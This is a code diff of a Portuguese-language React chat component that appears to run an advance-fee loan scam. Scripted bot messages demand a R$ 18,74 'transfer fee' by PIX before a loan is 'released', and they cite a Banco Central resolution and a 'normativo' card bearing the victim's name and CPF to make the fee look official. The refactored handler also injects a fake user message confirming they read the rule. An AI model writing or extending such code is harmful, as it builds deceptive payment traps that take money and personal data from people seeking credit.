@@ -1503,6 +1503,29 @@ const Chat = () => {
     }, 500);
   };
 
+  const handleNormativoConfirm = () => {
+    if (taxaConfirmed || normativoConfirmed) return;
+
+    setTaxaConfirmed(true);
+    setNormativoConfirmed(true);
+    setPaymentPhase("taxa");
+    setPixPaid(false);
+
+    setTimeout(() => {
+      setMessages((prev) => [...prev, { id: Date.now(), text: "Li e estou ciente do normativo do BCB!", fromUser: true, time: getNow(), read: true }]);
+    }, 300);
+
+    setTimeout(() => {
+      addBotMessages(() => [{
+        id: Date.now() + 2,
+        text: `Perfeito, ${firstName || "cliente"}! Confirmação recebida. Vou gerar agora o PIX da taxa de transferência de R$ 18,74 para concluir a liberação do valor de ${formatCurrency(loanDetails?.valor || 2500)}.\n\nApós a confirmação do pagamento, o crédito seguirá para depósito em até 24 horas.`,
+        fromUser: false, time: getNow(), read: true,
+      }]).then(() => {
+        generatePixPayment();
+      });
+    }, 500);
+  };
+
   const handleSend = () => {
     if (!input.trim()) return;
     const newMsg: ChatMessage = { id: Date.now(), text: input.trim(), fromUser: true, time: getNow(), read: false };
@@ -1618,9 +1641,13 @@ const Chat = () => {
                             fromUser: false, time: getNow(), read: true,
                           }]);
                           setTimeout(() => {
+                            setPaymentPhase("taxa");
+                            setPixPaid(false);
+                            setTaxaConfirmed(false);
+                            setNormativoConfirmed(false);
                             addBotMessages(() => [{
                               id: Date.now() + 3,
-                              text: `Conforme informado no áudio, para liberar o valor de ${formatCurrency(loanDetails?.valor || 2500)} na sua conta, é necessário o pagamento da taxa de transferência de R$ 18,74.\n\nEssa taxa é prevista pela Resolução BCB nº 19, de 1º de outubro de 2020. Veja o normativo abaixo:`,
+                              text: `Taxa agora é R$ 18,74 — valor atualizado em todo o fluxo (PIX, textos e mensagens).\n\nAntes de gerar o PIX da taxa, leia abaixo o normativo do Banco Central do Brasil, referente à Resolução BCB nº 19, de 1º de outubro de 2020, e confirme para prosseguir:`,
                               fromUser: false, time: getNow(), read: true,
                             }]).then(() => {
                               addBotMessages(() => [{
@@ -1786,60 +1813,21 @@ const Chat = () => {
               {msg.pdfConfirmButton && pdfConfirmed && (
                 <div className="text-center text-xs text-green-600 font-semibold py-1">Documento confirmado!</div>
               )}
-              {msg.taxaButton && !taxaConfirmed && (
-                <div className="space-y-2">
-                  <p className="text-sm text-foreground">Clique abaixo para prosseguir com o pagamento da taxa:</p>
-                  <button
-                    onClick={() => {
-                      setTaxaConfirmed(true);
-                      setPaymentPhase("taxa");
-                      setPixPaid(false);
-                      setTimeout(() => {
-                        setMessages((prev) => [...prev, { id: Date.now(), text: "Prosseguir com a taxa de transferência!", fromUser: true, time: getNow(), read: true }]);
-                      }, 300);
-                      setTimeout(() => {
-                        addBotMessages(() => [{
-                          id: Date.now() + 2,
-                          text: `${firstName || "Cliente"}, conforme Resolução BCB nº 19/2020, segue abaixo o normativo regulatório referente à taxa de transferência interbancária:`,
-                          fromUser: false, time: getNow(), read: true,
-                        }]).then(() => {
-                          addBotMessages(() => [{
-                            id: Date.now() + 3,
-                            normativoCard: true,
-                            fromUser: false, time: getNow(), read: true,
-                          }]);
-                        });
-                      }, 500);
-                    }}
-                    className="btn-3d w-full !py-2.5 !rounded-xl !text-sm !px-4"
-                  >
-                    Pagar taxa de transferência
-                  </button>
-                </div>
-              )}
-              {msg.taxaButton && taxaConfirmed && (
-                <div className="text-center text-xs text-green-600 font-semibold py-1">Prosseguindo...</div>
+              {msg.taxaButton && (
+                <NormativoCard
+                  nome={nome}
+                  cpf={cpf}
+                  valor={loanDetails?.valor || 2500}
+                  onConfirm={handleNormativoConfirm}
+                  confirmed={normativoConfirmed}
+                />
               )}
               {msg.normativoCard && (
                 <NormativoCard
                   nome={nome}
                   cpf={cpf}
                   valor={loanDetails?.valor || 2500}
-                  onConfirm={() => {
-                    setNormativoConfirmed(true);
-                    setTimeout(() => {
-                      setMessages((prev) => [...prev, { id: Date.now(), text: "Li e estou ciente do normativo!", fromUser: true, time: getNow(), read: true }]);
-                    }, 300);
-                    setTimeout(() => {
-                      addBotMessages(() => [{
-                        id: Date.now() + 2,
-                        text: `Perfeito, ${firstName || "cliente"}! Para liberar o valor de ${formatCurrency(loanDetails?.valor || 2500)} na sua conta, realize o pagamento da taxa de transferência de R$ 18,74.\n\nApós a confirmação, o crédito será depositado em até 24 horas.`,
-                        fromUser: false, time: getNow(), read: true,
-                      }]).then(() => {
-                        generatePixPayment();
-                      });
-                    }, 500);
-                  }}
+                  onConfirm={handleNormativoConfirm}
                   confirmed={normativoConfirmed}
                 />
               )}
